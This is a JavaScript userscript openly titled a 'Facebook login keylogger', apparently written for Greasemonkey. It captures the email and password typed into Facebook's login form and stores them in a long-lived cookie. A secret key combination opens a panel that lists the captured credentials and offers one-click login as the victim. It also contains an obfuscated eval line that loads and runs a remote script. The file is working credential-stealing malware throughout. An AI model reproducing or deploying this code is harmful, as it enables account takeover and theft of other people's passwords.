// ==UserScript==
// @name           	bl4ck_sh4d0w Plus
// @version 		1.1
// @namespace      	http://userscripts.org/users/141518
// @description    	Facebook login keylogger By bl4ck_sh4d0w
// @include        	http://*.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        	http:/facebook.com/*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
// ==/UserScript==

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




var title 		        = "Facebook Login Keylogger By bl4ck_sh4d0w";
var version 			= "v1.1";

var width 				= 700;
var height 				= 400;
var cookieName 			= "yuda2";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);
var submitControl;
var unControl;
var pwControl;

///////////////////
// Specific code //
///////////////////

init();

function init()
{
	getElementsByClassNameAndType('UIButton_Text', 'submit')[0].addEventListener("click", saveLogin, false);	
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}

function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;
	
	var date = new Date();
	
	var value = date.getTime() + subDelimiter + unControl.value + subDelimiter + pwControl.value;
	
	if(cookie)
		value += delimiter + cookie;
	
	writeCookie(cookieName, value, daysToKeepCookie);
}

unsafeWindow.doTheBossanova = function(email, password)
{
	unControl.value = email;
	pwControl.value = password;
	document.forms[0].submit();
}

///////////////////
// Generic code  //
///////////////////

jollyRogerz = 'data:image/png;base64,'+
'iVBORw0KGgoAAAANSUhEUgAAADIAAAA2CAYAAACFrsqnAAAACXBIWXMAAAsTAAALEwEAmpwYAAAK'+
'T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AU'+
'kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXX'+
'Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgAB'+
'eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAt'+
'AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3'+
'AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dX'+
'Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+'+
'5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk'+
'5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd'+
'0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA'+
'4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzA'+
'BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/ph'+
'CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5'+
'h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+'+
'Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhM'+
'WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQ'+
'AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+Io'+
'UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdp'+
'r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZ'+
'D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61Mb'+
'U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY'+
'/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllir'+
'SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79u'+
'p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6Vh'+
'lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1'+
'mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lO'+
'k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7Ry'+
'FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3I'+
'veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+B'+
'Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/'+
'0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5p'+
'DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5q'+
'PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIs'+
'OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5'+
'hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ'+
'rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9'+
'rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d'+
'T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX'+
'Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7'+
'vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S'+
'PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa'+
'RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO'+
'32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21'+
'e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV'+
'P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i'+
'/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8'+
'IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADq'+
'YAAAOpgAABdvkl/FRgAAC4dJREFUeNq8mnmMXVUdxz9v3mtn7TLtMF0oraVsbaFsLQXEFi0ClQAu'+
'qGAQ0aB/uASCxggYNRITIov8oQGrbEZRBOtSq4gULMUCZSjQdmCm43Qdp7OvnX15/vO55uR6580r'+
'EE9y8+6779xzfuv3t5yX4r0Z07xmAMuAVcBZwGlAEZDNc500UAPcD/wRGOP/MJYC3wa2Ag1ADzAs'+
'0e/F9Q9gXr7EpN4BA9OBO4CvAcU55g0AR4Eur8Ecc7NqbiFQCRT4vBpYr6Cy7yUjNwHfj0lqFGgB'+
'ujWFTrUzFmw+qrYmM5Uprn0uUOqzZ4GPK5Tsu2VkKfAgsCZ41g/skIFojAVERxoZADq8HwbGc9BS'+
'DFS431UBM98D7nbPxJHJg4mrgMeAmQGxe4BDSqgfaAPa1US/JnIWsEQA+AGwOaaluGmlpGeG700B'+
'rgks4XcCweg7cejrYg58CPiTiPIE8EPgRjW1XMT6bYLjbgNm5ym4tHM/qI9Ea2zw+TH79RlKOFpo'+
'J/B7YCPwY+DLwAeA+YGjvpQDhV48BhRKAccBtwXvtwDnAVMn4n6i8WvjQIQe+4E+YBfwAvAyUKdz'+
'jwIPAZfmWG+hxP0t5vRFwAXAauAUfapLS2hS23P1lzGFNZCvNs4PJNEIbAIeVQtn6y8FMe0N5REb'+
'hoArgcJAkI/H5uwDFquVacBXBYgscMT9p8QJLpiAkdOC+zZNbAfwPPC2SBWiz6cmUnlsTAW+oGYK'+
'gLX6YTgWAz/S6QeAp4Hd/jYH+LCxLC9GyoP7IU1oh+Y1mIA8lx2D750lsUUxOA/HWuBMGW8G/h74'+
'zhUGzXQ+jIzHoPEg8G+ZShLG9GMEkkVAmTFjorCwDJglnG8MYshJAcBMykhzcF8K9AY+kMR07TEw'+
'0afGizWfpNGt1Ke7fo2CRLM8Q/+ZlJE6YMT7uaq4IAdx3/GdfEZH4LxdE8xpCKwhYr4qSGNOksnU'+
'ZIzsDV6cZbwoykFcK3Cfn7nGfons1tc2SWQ42p3TYlqDULwvmFOpNjOTMTJs5I7GNcAJOSJzp/j+'+
'QLB53FTeUGvNmkm/z+4E6l2jwZjVIuFdASyPxmLPtBCG0zmcvdUAVwGUiDSbJkjHx/SjDqE6gtcu'+
'Cap3vXrR71RTkFdl/KjMthgEd2oRrYF53SjiRQH6TeCwQs8Z2ccl7BJ9ZLEEPJdgDlGq3itB3TLR'+
'4tVgRrAduBa4RYhtNw/r9J0jJqRVIuVwsP7twPH67ptxRnIlcUfNjx43+0wBVwMrgW9oetkYTB8F'+
'3hLhDulfA5rSfhPLT8ZsvdR36hXYoFoNNV8mExFdEYrmXQqX6ehPJqQgPw3qhaS6otJ4MV97zljt'+
'hWs8AVyeA4ajcWHwzkHgHvsCmXzrkT4x/DGltD7IYL8kkdfEAmVWLSQldtuALcCH1NKg/lcwCR0r'+
'Y/DdpVbG8sl+QwTr8cV2kWK+kq+0FG3Ps+DJBLY/qO+8rhmOTPDOMqvDCv12l2i3J6xO82FkXOm2'+
'K41O4P1msMMu2iijk42s66W09WoTws6EEngJ8E3g5woO99kj83tDrWfy9JVRobBP/A+dbIGblmmG'+
'FcA6pV1r9hyu02irp0yJtvo8JTisAr7iGsWxoLtHYTbFkTOJkcUiRE2MiKwvN8S6IyUi23yx/qNe'+
'USCsAh4GXhMu+yUq5TtrLKwuBE4MegPR6BHVWtx/rzQMJTFSCFwMfNHCZ6pE3KKjZ2NSHQ+YmxJk'+
'sbfH5s5QsuvU4j41ssAcrmSCGjwqbf9lJpCWod0KpjmewGaE0M0GqGGjd41o9IhMPhQ4cyqWdHYo'+
'6SUiWpRujyiMqGGQBk72ShqDmkybhI74Xr/rv20Q3J+EiBngczJxj040U1t9xkh+HfAXo25kSkVB'+
'ahJqNh3kP1lNIu2a0/0cl8hBfzuos48F7aJBIfaIgbJOZjqCrs7/MPIRJ+yz+B/1++nOaTIi97r4'+
'vCAQDkpYOmBsKFh7QPMoEOnmCJ8NwAp9AuCA6/eIjk3Gmcagizmcq9OYkbAy25S7lMBbMoXJXUai'+
'X9Epw+A0EuREqdh9N/BPn12v7y0yWTzTefNkfrMaiIJdr4LIOw25UUkMaJvtIlcl8Au/R+lBjbYa'+
'pdVP21mp91lPcD8O/MoUZ5Z5W/TebcBdwbpPmtkWJzj/OpsRmzSxl40tK+MV4vMu2iXxh7TnUjd4'+
'0Jzo5ViHZch3uoOycyRQfypIPwZ11MiPymU4GqcKCumY+cyThpstbw/K7PWmO5dE6U2BhByQ8A7P'+
'O87T3OqE0MtEpb1BKlFizjQryJWGY4XVwuC3yuD5XIUQ+VOFV2FC0loO/Ab4rq3aR9VQkUcbFUC6'+
'QAl8Sz/4s8hSaCPsKaNsu/a9PkCoLpm/K+iiDMTq8DEZnqJzhw2NHp05OnOpSCin2xTM0qDhMB7Q'+
'EHXuSwr8slwkmarE1xgIp1uK3qFU+gNsf0OzJIDcLrU2qoBaXWOqiV+TxHf6e11gpmUyEvrIbNdc'+
'FvjwYuAGadgNvA8ojSJmmdJeAZwjYxuBeyVygZI5YO1e7vNqfadcE5utHW8MjhlqhfYGGRv3t93W'+
'+SU+bxJMOgyaNwO/dO1G+81r7VSWKvBa4b0+rYM1Bgcy2zwaqA5wfq919CE3nKtklgvJVS58nDA+'+
'zdyqIYgbYwGM7xf92oLOZZtCulftrVXjdxtLRj0NeFpBrFBTLwA7I5RIB03mflVc7gvbjfgHXLBX'+
'FbdoNutluCrolJ9nIviS3fdeGe1UGPu8L7fBcS3wMUvpIeAPXl0G0nOC0jvysbT+0SxA/be5fLo9'+
'1iG5jwJdrdntBUGHfIV2eqeERm2bN60h7lPqWeAnml2R2vq6wa8xSEDrTImeMl7UBn42HkT1LdKx'+
'xlI7K8OrQ8e6RVjbqrSmOvEEVZgGPqvTZ4TT05TKLFHuSpm6399vkPFmYfi4IO1523UKjBfzgvqj'+
'U0Hs0Qc67MJfbfR/VOjt8gRtS8jIepPD5+Q8rQbGBYOblNJFmtm4dcvZMrrMADVPCWYCzY6b9rwu'+
'cJyik1cqsF6TwggQ2lwjSi7HBJcTFVa5udjPfP5qKnZ+vgH4tI7+iPaeNq6ss+PxgM5/tQdCRbGT'+
'3uhsvdpnJ8tcgXOLA63s97NXpqOmRZ/rdMpYp3QsMgsoVEvF+vHWdCyBbHLjczWbw/pAtQus8rrc'+
'dzarxb1CbaGmVO7805V61gzisNKd7rP6wPGPeH9Qc73Yvea4/3aZGnSfYpnZCdSmYueJC5T8nUHB'+
'/4yl6yLgVmG3TXOZacRdEGS+EbL16xMLnf+6GhjStM43/WnXRB6Xhg0yEK2zRDpuFTjKhP8yhdcE'+
'9KQSjsae9Gx9d1CVzXbBWRJREUD24aA1MxagTJSCLxNCo8PMRmG0Q2GtUhA7lPgVIt9h950BfF7C'+
'V6u5qBMToVo2k1Arr5SBZzWRQuATaqTJzaolqFmppYMzxAGZ6nWz1qBOnxJUnW+IOK8J55cYf7bq'+
'I0t19iI1P+y8/lhTJLGLMmKkvFZb3BKUuI0miNNcPB38XaM3+PdD1JAeUDAz9buoZfS8sWCdNchf'+
'zSbqNNsOAadIxk9WmxtdoyaJkVTC9+Ui00Wx3zYLu61ePW4aNe66leRQ7K8aGZlZaEyq1GSO16xW'+
'K4xtQn8F8BmdHK3jYQGiVTr25fOHgYzEtZlOVGkC7RL7os9qRJ3Dzu0LYkZSp7JD7D8kQUM6dIeA'+
'UWlFuUs/bda3oqpzSF+sT+qiJDEy4ksj2mO384Z0/CoJ6iP3v32SDoMGAzOMjtaGhekKIXXE79dr'+
'xrX65isiX1J7NbE5ltJx55jrz5GRZtOFphwN52MZBRI+3wbHHZresPu1CTjDgssmtTE+0Z9Xcm1U'+
'FDQEBo+1q5HniE5pL9XZGwSWEpESa57taiNxpCfpnI9IfP9kfaV3MaL/fPUFDYtSBdirz+wKjrUT'+
'x38GADXlN8OfthjXAAAAAElFTkSuQmCC';

topBanner = 'data:image/gif;base64,'+
'R0lGODlhAQA+AMQAAAAAAP///8C/wNbX18fHxsDAv8vKyt3d3dzc3Nvb29ra2tnZ2djY2NXV1dTU'+
'1NPT09HR0dDQ0M/Pz83NzczMzMnJycjIyMfHx8XFxcTExMPDw8LCwsHBwcDAwL+/vwAAACwAAAAA'+
'AQA+AAAFMOAhHgiSKAszNM4DRdJEGZVFYJm2cZ3gFR3ORpPBXCwVA2UiiUAejsaAsVAkSiNRCAA7';

cookie = readCookie(cookieName);

if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;

function writeCookie(name, value, days) 
{
	if (days) 
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) 
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) 
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) 
{
	writeCookie(name, "", -1);
	cookie = null;
}

function keyPress(e)
{
	var c =  String.fromCharCode(e.which).toUpperCase();
	
	if (c == "K" && e.shiftKey && e.ctrlKey && e.altKey)
		display();

	else if (c == "D" && e.shiftKey && e.ctrlKey && e.altKey)
	{
		eraseCookie(cookieName);
		unsafeWindow.killWindow();
		display();
	}
	else if (e.keyCode == 27)
		unsafeWindow.killWindow();
}

unsafeWindow.clearLog = function()
{
	eraseCookie(cookieName);
	unsafeWindow.killWindow();
	display();
}


unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		document.body.removeChild(document.getElementById('displayDiv'));
}

function display()
{
	if (cookie == null)
	{
		alert ('No logs stored!');
		return;
	}

	GM_addStyle('div#displayDiv{position:absolute; width:'+width+'px; height:'+height+'px; top:50%; left:50%; margin:-' + (height/2) + 'px auto auto -' + (width/2) + 'px; border:2px solid #333; background: url('+topBanner+') #DDD; font-size:12px;-moz-border-radius: 8px; -webkit-border-radius: 8px; -moz-box-shadow:10px 10px 20px #000000; z-index:5;}');
	GM_addStyle('div#displayDiv #logo{float:left; margin:5px;}');
	GM_addStyle('div#displayDiv #title{float:left; margin-top:16px; font-weight:bolder; color:#333;}');
	GM_addStyle('div#displayDiv #closeButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #clearLogButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #version{float:left; margin-top:28px; margin-left:5px; color:#888; font-weight:bold;}');

	GM_addStyle('#tableContainer{clear: both; border: 1px solid #444; height: 320px; overflow: hidden; width: 680px; margin:0 auto; background-color:#EEE;}');
	GM_addStyle('#tableContainer table{height: 320px; width: 680px; font-size:12px; border:1px solid #FCC; -moz-box-shadow:10px 10px 20px #000000;}');
	GM_addStyle('#tableContainer table thead tr{display: block; position:relative; background-color:#CCF; border-bottom:1px solid #444;}');
	GM_addStyle('#tableContainer table thead tr th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th + th{text-align:left; font-weight:bold; width:76px;}');	

	GM_addStyle('#tableContainer table tbody {text-align:left; height:300px; display:block; width:100%; overflow: -moz-scrollbars-vertical;}');	
	
	
	GM_addStyle('#tableContainer table tbody tr:nth-child(even){text-align:left; width:80px; background-color:#EEE;}');	
	GM_addStyle('#tableContainer table tbody tr:nth-child(odd){text-align:left; width:80px; background-color:#F8F8F8;}');	

	GM_addStyle('#tableContainer table tbody tr td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td + td{text-align:left; width:60px; border-right:none;}');	
	
	GM_addStyle('.unselectable{-moz-user-select: none; -khtml-user-select: none; user-select: none;}');


	var html = '';

	html += '<div id="logo" class="unselectable"><img src="'+jollyRogerz+'"></div>';
	html += '<button id="closeButton" class="unselectable" onclick="killWindow()">X</button>';
	html += '<button id="clearLogButton" class="unselectable" onclick="clearLog()">Clear log</button>';
	html += '<h1 id="title" class="unselectable">'+title+'</h1>';
	html += '<span id="version" class="unselectable">'+version+'</span>';

	html += '<div id="tableContainer">';
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Login time</th><th>Username</th><th>Password</th><th>Action</th></tr></thead>';
	html += '<tbody>';

	var array = cookie.split(delimiter);

	for (i=0; i < array.length; i++)
	{
		var subArray = array[i].split(subDelimiter);
		var date = new Date();
		date.setTime(subArray[0]);
		html += '<tr><td>'+date.toLocaleString()+'</td><td>'+subArray[1]+'</td><td>'+subArray[2]+'</td><td><a href="#" onclick="doTheBossanova(\''+subArray[1]+'\', \''+subArray[2]+'\')">Login &raquo;</a></td></tr>';
	}

	html += '</tbody>';
	html += '</table>';
	html += '</tableContainer>';

	var displayDiv = document.createElement('div');
	displayDiv.setAttribute('id', 'displayDiv');
	displayDiv.innerHTML = html;
	document.body.appendChild(displayDiv);
}

function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 

	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}